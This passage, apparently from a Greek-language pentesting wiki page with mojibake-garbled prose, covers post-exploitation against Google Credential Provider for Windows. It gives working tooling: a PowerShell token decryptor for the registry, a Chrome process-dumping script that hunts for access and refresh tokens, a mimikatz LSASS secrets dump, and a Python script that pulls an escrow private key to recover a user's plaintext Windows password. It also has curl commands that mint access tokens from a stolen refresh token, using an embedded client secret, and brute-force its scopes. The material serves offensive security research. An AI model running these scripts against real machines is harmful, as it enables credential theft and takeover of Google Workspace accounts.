$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¾ÏŒÎ´Î¿Ï…:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

ÎŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎµ ÏƒÎµ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î²Î¯Î½Ï„ÎµÎ¿**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), Î±Î½ Î´ÎµÎ½ Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ token ÏƒÏ„Î¿ Î¼Î·Ï„ÏÏÎ¿, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® (Î® Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ) Î±Ï€ÏŒ **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** ÎºÎ±Î¹ Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¾Î±Î½Î¬ ÎºÎ±Î¹ Ï„Î¿ **token Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Î¼Î·Ï„ÏÏÎ¿**.

### GCPW - Î”Î¯ÏƒÎºÎ¿Ï‚ Î‘Î½Î±Î½ÎµÏ‰Ï„Î¹ÎºÏÎ½ Tokens

Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`%LocalAppData%\Google\Chrome\User Data\Local State`** Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Ï„Ï‰Î½ **`refresh_tokens`** Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î± **Ï€ÏÎ¿Ï†Î¯Î» Google Chrome** Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏŒÏ€Ï‰Ï‚:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ **C# code** Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î¬ Ï„Î± tokens Î¼Îµ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ Ï„ÏÏŒÏ€Î¿ ÏƒÏ„Î¿ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ·Î¸ÎµÎ¯ ÏŒÏ„Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ AESGCM, Ï„Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ token Î¾ÎµÎºÎ¹Î½Î¬ Î¼Îµ Î¼Î¹Î± **Î­ÎºÎ´Î¿ÏƒÎ·** (**`v10`** Î±Ï…Ï„Î® Ï„Î· ÏƒÏ„Î¹Î³Î¼Î®), ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î­Ï‡ÎµÎ¹ [**12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î­Ï‡ÎµÎ¹ Ï„Î¿ **cypher-text** Î¼Îµ Î­Î½Î± Ï„ÎµÎ»Î¹ÎºÏŒ **mac 16B**.

### GCPW - Dumping tokens Î±Ï€ÏŒ Ï„Î· Î¼Î½Î®Î¼Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ script Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± **dump** ÎºÎ¬Î¸Îµ **Chrome** Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `procdump`, Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï„Î¹Ï‚ **Î±Î»Ï†Î±Î²Î·Ï„Î¹ÎºÎ­Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯ÎµÏ‚** ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± **Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹** Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ **access ÎºÎ±Î¹ refresh tokens**.

**Î‘Ï€ÏŒ Ï„Î·Î½ ÎµÎ¼Ï€ÎµÎ¹ÏÎ¯Î± Î¼Î¿Ï…, Î´ÎµÎ½ Î²ÏÎ®ÎºÎµ ÎºÎ±Î½Î­Î½Î± token dumping Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¹ÏÎ½ Chrome Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± `gcpw_extension.exe`.**

<details>

<summary>Dump Chrome processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\path\to\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\path\to\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\ChromeDumps"
$targetString = "ya29" # "1//" for refresh_tokens

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for the target string in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$asciiStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_ascii_strings.txt"
$unicodeStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_unicode_strings.txt"

Write-Output "Extracting ASCII strings from $dumpFile"
& $stringsPath $dumpFile > $asciiStringsOutputFile

Write-Output "Extracting UTF-16 strings from $dumpFile"
& $stringsPath -u $dumpFile > $unicodeStringsOutputFile

Write-Output "Searching for '$targetString' in $asciiStringsOutputFile"
Select-String -Path $asciiStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}

Write-Output "Searching for '$targetString' in $unicodeStringsOutputFile"
Select-String -Path $unicodeStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}
}
```
</details>

### GCPW - Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Ï„Î¿Ï… ÎºÎ±Î¸Î±ÏÎ¿Ï ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚

Î“Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿ GCPW Î³Î¹Î± Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿Ï‚ Î±Ï€ÏŒ Ï„Î¿ **LSASS** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ ÏŒÏ€Ï‰Ï‚ `Chrome-GCPW-<sid>` ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î±:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Îµ Î­Î½Î± **access token** Î¼Îµ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ `https://www.google.com/accounts/OAuthLogin`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚:

<details>

<summary>Script Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ ÎºÎ±Î¸Î±ÏÏŒ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î´ÎµÎ´Î¿Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… access token, Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ ÎºÎ±Î¹ Ï„Î¿Ï… Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÎ¿Ï Ï€ÏŒÏÎ¿Ï…</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î± Î²Î±ÏƒÎ¹ÎºÎ¬ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± Î±Ï…Ï„Î¿Ï ÏƒÏ„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Chromium:

* API domain: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API endpoint: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)
*

### GCPW - Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ Î±Î½Î±Î½ÎµÏ‰Ï„Î¹ÎºÎ¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î±Î½Î±Î½ÎµÏ‰Ï„Î¹ÎºÏŒ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î¿, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î¿ÏÎ½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ±Î¹ Ï„Î¿ client ID ÎºÎ±Î¹ client secret Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

ÎšÎ±Ï„Î¬ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ GCPW Î´ÎµÎ½ Î¸Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Ï‰Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï€Î¹Î¸Î±Î½ÏŒ OAuth scope, Î¿Ï€ÏŒÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î± scopes Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î¼Îµ Ï„Î¿ `refresh_token` Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯ Î­Î½Î± `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ÎšÎ±Î¹ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï€Î¿Ï… Ï€Î®ÏÎ± Ï„Î· ÏƒÏ„Î¹Î³Î¼Î® Ï€Î¿Ï… Î­Î³ÏÎ±Ï†Î±:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Chromium ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± [**Î²ÏÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ **Î¬Î»Î»ÎµÏ‚ ÏƒÏ†Î±Î¯ÏÎµÏ‚** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿Ï„ÎµÎ¸ÎµÎ¯ ÏŒÏ„Î¹ **Î´ÎµÎ½ ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î· Î»Î¯ÏƒÏ„Î± Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ Ï…Ï€Î¿ÏƒÏ„ÎµÎ¯ Î²Î¯Î±Î¹Î· Î´Î¿ÎºÎ¹Î¼Î®**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÏƒÏ†Î±Î¯ÏÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï…Ï€Î¿Ï„ÎµÎ¸Î¿ÏÎ½:

<details>

<summary>Î•Ï€Î¹Ï€Î»Î­Î¿Î½ ÏƒÏ†Î±Î¯ÏÎµÏ‚</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Ï€Î¹Î¿ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏÏ‚:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
